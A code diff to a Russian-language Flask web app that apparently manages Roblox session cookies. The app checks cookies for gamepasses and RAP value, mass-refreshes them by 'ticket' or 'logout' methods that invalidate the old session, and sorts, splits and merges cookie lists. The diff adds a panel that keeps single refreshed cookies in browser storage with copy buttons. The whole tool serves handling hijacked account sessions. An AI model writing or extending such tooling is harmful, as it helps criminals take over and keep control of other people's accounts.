@@ -138,7 +138,6 @@ def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple:
 
 app = Flask(__name__)
 
-# Метка времени запуска сервера для проверки обновления на хосте
 SERVER_START_TIME = datetime.now().strftime('%H:%M:%S')
 
 HTML = """<!DOCTYPE html>
@@ -159,7 +158,6 @@ HTML = """<!DOCTYPE html>
             position: relative;
         }
         
-        /* Индикатор теста и обновления в уголке */
         .host-test-badge {
             position: fixed;
             bottom: 15px;
@@ -258,7 +256,6 @@ HTML = """<!DOCTYPE html>
             margin-bottom: 24px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.6);
         }
-        .card:hover { border-color: #4a2a70; }
         .card h2 {
             font-family: 'Poppins', sans-serif;
             font-weight: 700;
@@ -548,6 +545,80 @@ HTML = """<!DOCTYPE html>
         .history-item .ok { color: #00b894; }
         .history-item .fail { color: #ff6b6b; }
 
+        /* Стили для истории одиночных фрешей */
+        .single-fresh-section {
+            margin-top: 24px;
+            background: rgba(14, 10, 30, 0.6);
+            border: 1px solid #2a1a50;
+            border-radius: 16px;
+            padding: 20px;
+        }
+        .single-fresh-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .single-fresh-header h3 {
+            font-family: 'Poppins', sans-serif;
+            font-weight: 700;
+            font-style: italic;
+            font-size: 16px;
+            color: #d4c0ff;
+        }
+        .single-history-list {
+            max-height: 220px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .single-history-card {
+            background: #0d0722;
+            border: 1px solid #2a1a50;
+            border-radius: 12px;
+            padding: 10px 14px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .single-history-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #8b72be;
+        }
+        .single-history-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .single-history-row code {
+            flex: 1;
+            font-size: 12px;
+            color: #c084fc;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .btn-mini-copy {
+            background: rgba(168, 85, 247, 0.2);
+            border: none;
+            color: #c084fc;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+        .btn-mini-copy:hover {
+            background: rgba(168, 85, 247, 0.4);
+            color: #fff;
+        }
+
         .footer {
             text-align: center; padding: 30px 0 12px; color: #4a3a6a; font-size: 13px;
             border-top: 1px solid #1a1040; margin-top: 30px;
@@ -561,7 +632,6 @@ HTML = """<!DOCTYPE html>
 </head>
 <body>
 
-<!-- Индикатор теста и времени обновления на хосте -->
 <div class="host-test-badge">
     <span></span> тест 1 (запуск: <strong id="serverTime">{{ server_time }}</strong>)
 </div>
@@ -621,7 +691,7 @@ HTML = """<!DOCTYPE html>
                     <button class="method-btn" id="logoutMethod" onclick="setFreshMethod('logout')">Logout method</button>
                 </div>
             </div>
-            <textarea class="fresh-textarea" id="freshInput" placeholder="Вставь куки для обновления (по одному на строку)"></textarea>
+            <textarea class="fresh-textarea" id="freshInput" placeholder="Вставь куки для обновления (по одному на строку или один кук для одиночного рефреша)"></textarea>
             <div class="fresh-controls">
                 <button class="btn-start" id="freshStartBtn" onclick="startFresh()">▶ Start</button>
                 <button class="btn-stop" id="freshStopBtn" disabled onclick="stopFresh()">■ Stop</button>
@@ -641,6 +711,18 @@ HTML = """<!DOCTYPE html>
                     <button class="copy-btn" id="freshCopyBtn">📋 Копировать</button>
                 </div>
             </div>
+
+            <!-- Блок истории одиночных/быстрых фрешей -->
+            <div class="single-fresh-section">
+                <div class="single-fresh-header">
+                    <h3>⚡ История одиночных фрешей</h3>
+                    <button class="btn btn-secondary" onclick="clearSingleHistory()" style="padding:4px 12px; font-size:11px;">🗑️ Очистить</button>
+                </div>
+                <div class="single-history-list" id="singleHistoryList">
+                    <div style="color:#6a6a8a; font-size:13px; padding:4px;">Нет свежих одиночных обновлений</div>
+                </div>
+            </div>
+
             <div class="fresh-history">
                 <h3>📜 Mass Refresher History</h3>
                 <div class="history-list" id="freshHistoryList">
@@ -699,7 +781,6 @@ HTML = """<!DOCTYPE html>
 </div>
 
 <script>
-    // Исправление кликов по областям загрузки файлов
     document.querySelectorAll('.upload-area').forEach(area => {
         area.addEventListener('click', function(e) {
             const input = this.parentElement.querySelector('input[type="file"]');
@@ -726,7 +807,6 @@ HTML = """<!DOCTYPE html>
         });
     });
 
-    // Надежное переключение вкладок (исправление проблемы с некликабельными кнопками)
     document.querySelectorAll('.tab').forEach(tab => {
         tab.addEventListener('click', function() {
             const tabId = this.getAttribute('data-tab');
@@ -776,15 +856,15 @@ HTML = """<!DOCTYPE html>
             
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Проверено: ${data.total || 0}\\n📦 Активных: ${data.total_gamepasses || 0}\\n💎 RAP: ${data.total_rap || 0}\\n\\n`;
+                let html = `✅ Проверено: ${data.total || 0}\n📦 Активных: ${data.total_gamepasses || 0}\n💎 RAP: ${data.total_rap || 0}\n\n`;
                 if (data.reports && data.reports.length) {
-                    html += `<b>📋 ОТЧЁТЫ:</b>\\n`;
+                    html += `<b>📋 ОТЧЁТЫ:</b>\n`;
                     for (const report of data.reports) {
-                        html += `\\n${report}\\n─────────────────\\n`;
+                        html += `\n${report}\n─────────────────\n`;
                     }
                 }
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                 }
                 resBox.innerHTML = html;
                 saveCheckerHistory(data.total || 0, data.total_gamepasses || 0, data.total_rap || 0);
@@ -855,7 +935,7 @@ HTML = """<!DOCTYPE html>
         const resultWrapper = document.getElementById('freshResultWrapper');
         const resultCode = document.getElementById('freshResultCode');
         
-        const cookies = input.value.trim().split('\\n').filter(c => c.trim().length > 50);
+        const cookies = input.value.trim().split('\n').filter(c => c.trim().length > 50);
         if (!cookies.length) {
             status.textContent = '❌ Нет куков';
             return;
@@ -898,6 +978,11 @@ HTML = """<!DOCTYPE html>
                     valid++;
                     newCookies.push(data.new_cookie);
                     validCount.textContent = valid;
+                    
+                    // Если это был одиночный фреш (1 кук), сразу сохраняем в историю одиночных
+                    if (cookies.length === 1) {
+                        saveSingleFreshHistory(data.new_cookie, freshMethod);
+                    }
                 } else {
                     invalid++;
                     invalidCount.textContent = invalid;
@@ -917,10 +1002,10 @@ HTML = """<!DOCTYPE html>
         progressText.textContent = '100%';
         
         if (newCookies.length) {
-            resultCode.textContent = newCookies.join('\\n');
+            resultCode.textContent = newCookies.join('\n');
             resultWrapper.style.display = 'flex';
             document.getElementById('freshCopyBtn').onclick = function() {
-                navigator.clipboard.writeText(newCookies.join('\\n')).then(() => {
+                navigator.clipboard.writeText(newCookies.join('\n')).then(() => {
                     this.textContent = '✅ Скопировано!';
                     setTimeout(() => { this.textContent = '📋 Копировать'; }, 2000);
                 });
@@ -942,6 +1027,50 @@ HTML = """<!DOCTYPE html>
         a.href = URL.createObjectURL(blob);
         a.download = `refreshed_cookies_${new Date().toISOString().slice(0,10)}.txt`;
         a.click();
+    }
+
+    // Логика истории одиночных фрешей
+    function saveSingleFreshHistory(cookie, method) {
+        const history = JSON.parse(localStorage.getItem('singleFreshHistory') || '[]');
+        history.unshift({ date: new Date().toLocaleTimeString(), cookie, method });
+        if (history.length > 25) history.pop();
+        localStorage.setItem('singleFreshHistory', JSON.stringify(history));
+        renderSingleFreshHistory();
+    }
+
+    function renderSingleFreshHistory() {
+        const list = document.getElementById('singleHistoryList');
+        const history = JSON.parse(localStorage.getItem('singleFreshHistory') || '[]');
+        if (history.length === 0) {
+            list.innerHTML = '<div style="color:#6a6a8a; font-size:13px; padding:4px;">Нет свежих одиночных обновлений</div>';
+            return;
+        }
+        list.innerHTML = history.map((item, index) => `
+            <div class="single-history-card">
+                <div class="single-history-top">
+                    <span>⚡ Одиночный фреш (${item.method === 'ticket' ? 'Ticket' : 'Logout'})</span>
+                    <span>${item.date}</span>
+                </div>
+                <div class="single-history-row">
+                    <code id="single-cook-${index}">${item.cookie}</code>
+                    <button class="btn-mini-copy" onclick="copySingleCookie('single-cook-${index}', this)">📋 Копировать</button>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function copySingleCookie(elementId, btn) {
+        const text = document.getElementById(elementId).textContent;
+        navigator.clipboard.writeText(text).then(() => {
+            const originalText = btn.textContent;
+            btn.textContent = '✅ Скопировано';
+            setTimeout(() => { btn.textContent = originalText; }, 2000);
+        });
+    }
+
+    function clearSingleHistory() {
+        localStorage.removeItem('singleFreshHistory');
+        renderSingleFreshHistory();
     }
 
     function saveFreshHistory(total, valid, invalid, errors) {
@@ -989,9 +1118,9 @@ HTML = """<!DOCTYPE html>
             const data = await r.json();
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Валидных: ${data.valid}\\n❌ Невалидных: ${data.invalid}\\n📊 Всего: ${data.total}`;
+                let html = `✅ Валидных: ${data.valid}\n❌ Невалидных: ${data.invalid}\n📊 Всего: ${data.total}`;
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать валидные</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать валидные</a>`;
                 }
                 resBox.innerHTML = html;
             } else {
@@ -1017,9 +1146,9 @@ HTML = """<!DOCTYPE html>
             const data = await r.json();
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Сортировка завершена!\\n📦 Куков: ${data.total}`;
+                let html = `✅ Сортировка завершена!\n📦 Куков: ${data.total}`;
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                 }
                 resBox.innerHTML = html;
             } else {
@@ -1045,9 +1174,9 @@ HTML = """<!DOCTYPE html>
             const data = await r.json();
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Разделение завершено!\\n📦 Куков: ${data.total}`;
+                let html = `✅ Разделение завершено!\n📦 Куков: ${data.total}`;
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                 }
                 resBox.innerHTML = html;
             } else {
@@ -1073,9 +1202,9 @@ HTML = """<!DOCTYPE html>
             const data = await r.json();
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Слияние завершено!\\n📦 Куков: ${data.total}\\n🔄 Дублей удалено: ${data.duplicates}`;
+                let html = `✅ Слияние завершено!\n📦 Куков: ${data.total}\n🔄 Дублей удалено: ${data.duplicates}`;
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать</a>`;
                 }
                 resBox.innerHTML = html;
             } else {
@@ -1090,6 +1219,7 @@ HTML = """<!DOCTYPE html>
 
     renderCheckerHistory();
     renderFreshHistory();
+    renderSingleFreshHistory();
 </script>
 </body>
 </html>"""
